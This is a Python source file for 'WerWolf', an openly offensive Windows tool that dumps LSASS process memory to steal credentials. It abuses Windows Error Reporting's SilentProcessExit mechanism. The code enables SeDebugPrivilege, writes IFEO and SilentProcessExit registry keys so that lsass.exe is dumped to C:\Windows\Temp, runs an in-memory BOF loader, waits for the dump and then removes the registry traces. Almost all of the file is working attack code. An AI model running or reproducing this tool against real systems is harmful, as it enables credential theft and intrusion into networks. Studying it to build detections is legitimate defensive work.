import sys
import os
import time
import glob
import subprocess
import logging
import platform
import ctypes


BANNER = r"""
                          ..
                         / _}
                  _     /  /
                / `\  /  /
                \   \/  /     WerWolf
                 \     /      --------
             ,    )   (       LSASS Credential Dumper
            / \_ / \   \      via RtlReportSilentProcessExit
           /       /    \
          /   __  /   _  \    Abusing Windows Error Reporting
         /   /  \/   / \  |   In-Memory COFF/BOF Loader
        |   /   /   /   | |
         \_/   /   /  _/ /
               \__/\_/ \_/
"""

BOF_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bofs", "wer_execute.o")
DUMP_DIR = r"C:\Windows\Temp"
IFEO_KEY = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe"
SILENT_KEY = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe"


def ensure_wersvc():
    """Make sure WerSvc is running. Start it and wait if needed."""
    r = subprocess.run(["sc", "query", "WerSvc"], capture_output=True, text=True)
    if "RUNNING" in r.stdout:
        print("[+] WerSvc is running")
        return
    print("[*] WerSvc is stopped, starting it...")
    subprocess.run(["sc", "config", "WerSvc", "start=", "demand"], capture_output=True)
    subprocess.run(["sc", "start", "WerSvc"], capture_output=True)
    for _ in range(10):
        time.sleep(1)
        r = subprocess.run(["sc", "query", "WerSvc"], capture_output=True, text=True)
        if "RUNNING" in r.stdout:
            print("[+] WerSvc started")
            return
    print("[!] WerSvc failed to start")
    sys.exit(1)


def enable_sedebug():
    """Enable SeDebugPrivilege at process level before BOF runs."""
    ntdll = ctypes.windll.ntdll
    was = ctypes.c_bool(False)
    status = ntdll.RtlAdjustPrivilege(ctypes.c_ulong(20), True, False, ctypes.byref(was))
    if status != 0:
        print(f"[!] SeDebugPrivilege failed: 0x{status & 0xFFFFFFFF:08X}")
        print("[!] Run as Administrator.")
        sys.exit(1)
    print("[+] SeDebugPrivilege enabled")


def setup_registry():
    import winreg
    key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, IFEO_KEY, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "GlobalFlag", 0, winreg.REG_DWORD, 0x200)
    winreg.CloseKey(key)
    key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, SILENT_KEY, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "ReportingMode", 0, winreg.REG_DWORD, 0x2)
    winreg.SetValueEx(key, "LocalDumpFolder", 0, winreg.REG_SZ, DUMP_DIR)
    winreg.SetValueEx(key, "DumpType", 0, winreg.REG_DWORD, 0x2)
    winreg.CloseKey(key)


def cleanup_registry():
    import winreg
    try:
        k = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, IFEO_KEY, 0, winreg.KEY_SET_VALUE)
        try: winreg.DeleteValue(k, "GlobalFlag")
        except FileNotFoundError: pass
        winreg.CloseKey(k)
    except OSError: pass
    try: winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, SILENT_KEY)
    except OSError: pass


def main():
    verbose = "-v" in sys.argv or "--verbose" in sys.argv
    logging.basicConfig(
        level=logging.DEBUG if verbose else logging.INFO,
        format="[%(levelname)s] %(message)s"
    )

    print(BANNER)

    if platform.system() != "Windows":
        print("[!] Windows required."); sys.exit(1)
    if not os.path.isfile(BOF_PATH):
        print(f"[!] BOF not found: {BOF_PATH}"); sys.exit(1)

    with open(BOF_PATH, "rb") as f:
        coff_data = f.read()

    print(f"[*] BOF file   : {BOF_PATH}")
    print(f"[*] File size  : {len(coff_data):,} bytes")
    print(f"[*] Platform   : {platform.system()} {platform.version()}")
    print()

    # 1. WerSvc must be running
    ensure_wersvc()

    # 2. SeDebugPrivilege at process level (fixes 1809)
    enable_sedebug()

    # 3. Registry setup
    print("[*] Setting registry keys...")
    setup_registry()
    print("[+] Silent Process Exit configured")
    print()

    # Mark timestamp so we only find NEW dumps
    start_time = time.time()

    # 4. Run the BOF
    from loader.loader import CoffLoader
    loader = CoffLoader()
    loader.load_and_execute(coff_data, entry_name="go")

    # 5. Re-set registry (BOF cleans them, WerFault needs them)
    print()
    print("[*] Re-setting registry keys (race condition fix)...")
    setup_registry()

    # 6. Wait for dump
    print("[*] Waiting for WerFault...")
    for i in range(60):
        # Only look for .dmp files created AFTER we started
        for f in glob.glob(os.path.join(DUMP_DIR, "*.dmp")):
            if os.path.getmtime(f) >= start_time:
                try:
                    size_mb = os.path.getsize(f) / (1024 * 1024)
                    if size_mb > 1:  # real dump, not empty
                        print(f"[+] Dump: {f} ({size_mb:.1f} MB)")
                        print("[*] Cleaning up...")
                        cleanup_registry()
                        print("[+] Done.")
                        return
                except OSError:
                    pass
        time.sleep(2)

    print("[!] No dump after 120 seconds.")
    print("[*] Cleaning up...")
    cleanup_registry()
    print(f"[*] Check {DUMP_DIR} manually.")


if __name__ == "__main__":
    main()
